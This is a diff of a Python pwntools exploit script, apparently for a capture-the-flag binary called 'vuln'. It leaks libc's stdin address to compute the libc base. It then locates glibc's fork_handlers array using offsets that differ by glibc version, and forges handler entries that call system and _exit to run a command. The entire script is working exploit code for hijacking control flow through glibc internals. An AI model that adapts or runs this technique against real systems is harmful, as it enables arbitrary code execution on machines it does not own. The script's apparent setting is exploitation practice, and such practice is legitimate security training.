@@ -1,20 +1,17 @@
 #!/usr/bin/env python3
 from pwn import *
 
-context.binary = elf = ELF("./vuln")
 context.log_level = "debug"
+
+io = process("./vuln_patched")
+# io = remote("localhost", 9999)
 
 libc = ELF("./libc.so.6")
 
-
-def detect_layout(libc: ELF):
-    """检测 libc 版本对应的 fork_handler 结构"""
-    if b"__run_prefork_handlers" in libc.symbols:
-        return 0x28, True
-    return 0x20, False
-
-
-HANDLER_SZ, HAS_ID = detect_layout(libc)
+# glibc 2.28-2.35
+# HANDLER_SZ, HAS_ID = 0x20, False
+# glibc 2.36+
+HANDLER_SZ, HAS_ID = 0x28, True
 
 
 def header(array_ptr, used):
@@ -51,8 +48,6 @@ def forge(base, *funcs, rdi=None):
     return header(array_ptr, used) + arr
 
 
-io = process("./vuln")
-
 io.recvuntil(b"gift: ")
 leak_line = io.recvline().strip()
 stdin_leak = int(leak_line, 16)
@@ -61,7 +56,8 @@ log.success(f"stdin leak: {hex(stdin_leak)}")
 libc.address = stdin_leak - libc.sym["_IO_2_1_stdin_"]
 log.success(f"libc base: {hex(libc.address)}")
 
-fork_handlers = libc.address + 0x0000000000221AE0
+# fork_handlers' address in glibc 2.36+ = <re_syntax_options@@GLIBC_2.2.5+0x80>
+fork_handlers = libc.sym.re_syntax_options + 0x80
 log.success(f"fork_handlers: {hex(fork_handlers)}")
 
 cmd_offset = len(forge(fork_handlers, libc.sym.system, libc.sym._exit))
